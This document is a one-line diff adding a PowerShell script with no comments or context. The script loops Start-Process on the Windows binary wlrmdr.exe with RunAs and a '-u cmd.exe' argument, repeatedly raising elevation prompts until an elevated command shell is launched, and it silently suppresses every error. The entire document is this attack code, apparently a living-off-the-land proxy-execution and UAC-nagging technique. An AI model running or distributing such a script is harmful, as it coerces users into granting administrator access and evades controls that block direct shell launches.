@@ -1,0 +1,1 @@
+﻿try { throw "" } catch { while ( -not $? ) { try { Start-Process wlrmdr.exe -ArgumentList "-s 3600 -f 0 -t _ -m _ -a 11 -u cmd.exe" -Verb RunAs } catch { Write-Error "" -ErrorAction SilentlyContinue } } }
